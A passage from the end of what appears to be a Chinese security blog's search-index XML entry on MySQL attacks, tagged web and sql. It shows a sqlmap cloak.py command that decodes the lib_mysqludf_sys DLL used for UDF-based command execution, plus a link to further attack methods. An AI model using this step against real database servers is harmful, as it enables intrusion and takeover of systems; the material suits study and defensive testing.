cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p><strong>更多攻击方法参考</strong></p><p><a href="https://www.sqlsec.com/2020/11/mysql.html#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">https://www.sqlsec.com/2020/11/mysql.html#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
